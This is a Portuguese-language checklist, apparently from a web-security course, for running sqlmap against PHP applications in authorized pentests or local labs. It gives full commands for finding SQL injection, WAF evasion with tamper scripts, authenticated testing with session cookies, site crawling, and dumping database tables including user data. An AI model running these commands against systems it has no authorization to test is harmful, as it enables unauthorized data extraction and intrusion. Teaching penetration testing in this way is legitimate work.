# Checklist geral de sqlmap — testando qualquer aplicação PHP

Guia prático para usar o [sqlmap](https://sqlmap.org) contra uma aplicação
PHP real (não só os exemplos deste curso). Pensado para pentest
autorizado / laboratório próprio — **nunca rode isso contra um sistema que
você não tem permissão explícita para testar** (uso não autorizado é
crime).

## 0. Antes de começar

- [ ] Você tem autorização explícita (escopo de pentest, ambiente próprio,
      ou CTF) para testar o alvo?
- [ ] Você sabe se o alvo é produção ou homologação? **Nunca** rode
      `--dump-all`, `--os-shell` ou opções destrutivas em produção sem
      combinar antes — sqlmap pode gerar MUITAS requisições.
- [ ] `sqlmap --version` funciona? (`brew install sqlmap` no macOS)

## 1. Mapear os pontos de entrada

Qualquer lugar que a aplicação PHP recebe input do usuário e o usa numa
query é candidato:

- [ ] Parâmetros de URL (`GET ?id=1`, `?usuario=x`)
- [ ] Campos de formulário (`POST`)
- [ ] Cookies (muita gente esquece — `session_id`, `preferencias`, etc.)
- [ ] Headers customizados (`X-Forwarded-For`, `User-Agent`, `Referer`)
- [ ] Corpo JSON de APIs (`Content-Type: application/json`)

## 2. Teste rápido de descoberta (GET simples)

```bash
sqlmap -u "http://alvo.exemplo.com/pagina.php?id=1" --batch
```

- [ ] `--batch` — não fica perguntando nada, usa sempre a opção padrão
      (essencial para rodar sem intervenção manual)

Se o sqlmap disser `parameter might not be injectable`, NÃO significa que
está seguro — só significa que o teste padrão (level=1, risk=1) não achou
nada. Vá para o passo 3.

## 3. Aumentar a profundidade do teste

```bash
sqlmap -u "http://alvo.exemplo.com/pagina.php?id=1" --batch --level=5 --risk=3
```

- [ ] `--level` (1 a 5) — quantos payloads diferentes tenta, e em quais
      lugares (URL, headers, cookies também entram a partir do level 2+)
- [ ] `--risk` (1 a 3) — quão "arriscados"/destrutivos são os payloads
      testados (risk 3 inclui coisas como `OR`-based que podem alterar
      dados em queries mal escritas — cuidado em produção)

`--level=5 --risk=3` é o teste mais exaustivo, mas também o mais lento e
mais "barulhento" (gera muito mais requisições e fica nos logs do alvo).

## 4. Focar num parâmetro específico (mais rápido)

```bash
sqlmap -u "http://alvo.exemplo.com/pagina.php?id=1&outro=2" -p id --batch
```

- [ ] `-p <parametro>` — testa só o parâmetro indicado em vez de todos
      (útil quando você já suspeita de qual campo é o problema, evita
      gastar tempo nos outros)

## 5. Testar POST / formulários

```bash
sqlmap -u "http://alvo.exemplo.com/login.php" \
  --data="usuario=admin&senha=x" --batch
```

Ou deixar o sqlmap achar o formulário sozinho na página:

```bash
sqlmap -u "http://alvo.exemplo.com/login.php" --forms --batch
```

- [ ] `--data` — envia como POST com o corpo especificado
- [ ] `--forms` — sqlmap busca `<form>` na página e testa os campos dele

## 6. Testar autenticado (área logada)

```bash
sqlmap -u "http://alvo.exemplo.com/painel.php?id=1" \
  --cookie="PHPSESSID=abc123xyz" --batch
```

- [ ] `--cookie="..."` — cookie de sessão válido (pegue do navegador
      depois de logar manualmente)
- [ ] `--auth-type=Basic --auth-cred="usuario:senha"` — se o site usa
      HTTP Basic Auth em vez de cookie de sessão

## 7. Explorar o site inteiro automaticamente

```bash
sqlmap -u "http://alvo.exemplo.com/" --crawl=3 --forms --batch
```

- [ ] `--crawl=N` — segue links a partir da URL inicial até N níveis de
      profundidade, testando cada página encontrada (bom para achar
      pontos de injeção que você não sabia que existiam)

## 8. Quando encontrar uma injeção — extrair informação

```bash
# Listar bancos de dados
sqlmap -u "..." -p id --batch --dbs

# Listar tabelas de um banco especifico
sqlmap -u "..." -p id --batch -D nome_do_banco --tables

# Listar colunas de uma tabela
sqlmap -u "..." -p id --batch -D nome_do_banco -T usuarios --columns

# Dump completo de uma tabela
sqlmap -u "..." -p id --batch -D nome_do_banco -T usuarios --dump

# Dump de TUDO (cuidado - pode demorar muito e ser bem invasivo)
sqlmap -u "..." -p id --batch --dump-all
```

- [ ] Depois de confirmar a injeção, sempre vale enumerar `--dbs` →
      `--tables` → `--columns` → `--dump` nessa ordem, em vez de já sair
      com `--dump-all` (mais controlado, você vê o que tem antes de puxar
      tudo)

## 9. Se o sqlmap não encontrar nada de primeira

- [ ] Tentou `--level=5 --risk=3`?
- [ ] O alvo tem WAF? Teste com `--random-agent` (varia o User-Agent) e
      `--tamper=space2comment` (ou outros scripts de tamper em
      `--tamper=?` para listar todos)
- [ ] O parâmetro é numérico ou string? Às vezes forçar o tipo ajuda:
      `--param-filter` / verificar se o parâmetro correto está sendo
      testado (`--test-filter`)
- [ ] Confirme que a resposta da aplicação realmente muda de acordo com
      a query (algumas páginas sempre retornam a mesma coisa independente
      do banco, aí sqlmap não consegue detectar nada porque não há
      diferença observável)

## 10. Depois de terminar

- [ ] `sqlmap --purge` limpa todo o histórico/sessões salvas localmente
      (`~/.local/share/sqlmap`), se você quiser começar do zero depois
- [ ] Documente o parâmetro vulnerável, o payload usado e o
      request/response completo — é isso que vai no relatório de pentest
- [ ] Nunca deixe sessões/dumps de dados sensíveis de um cliente real
      espalhados no seu disco depois do teste

## Opções mais usadas, resumo rápido

| Opção | Para quê |
|---|---|
| `--batch` | Não interativo, sempre usa a resposta padrão |
| `-u "url"` | URL alvo |
| `-p param` | Foca só nesse parâmetro |
| `--data="a=1&b=2"` | Testa via POST |
| `--cookie="..."` | Sessão autenticada |
| `--level=1..5` | Profundidade dos testes |
| `--risk=1..3` | Agressividade dos payloads |
| `--technique=BEUSTQ` | Restringe a técnicas específicas (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline) |
| `--dbms=mysql/postgresql/sqlite/...` | Já informa o banco, pula fingerprint (bem mais rápido) |
| `--crawl=N` | Rastreia o site a partir da URL |
| `--forms` | Testa formulários HTML encontrados na página |
| `--dbs` / `--tables` / `--columns` / `--dump` | Enumeração progressiva de dados |
| `--flush-session` | Ignora cache de sessão anterior, testa do zero |
| `--random-agent` | User-Agent aleatório (ajuda contra alguns WAFs simples) |
| `--tamper=...` | Scripts para ofuscar payload e tentar passar por filtros |

## Este projeto como laboratório

As pastas `A05-injecao/01-sql-injection/` e `A05-injecao/07-orm-injection/`
têm um `endpoint-vulneravel.php` + `endpoint-corrigido.php` + um script
`./testar-com-sqlmap.sh` já prontos — rode-os para praticar sqlmap num
alvo local, seguro e controlado, antes de usar em qualquer coisa real.
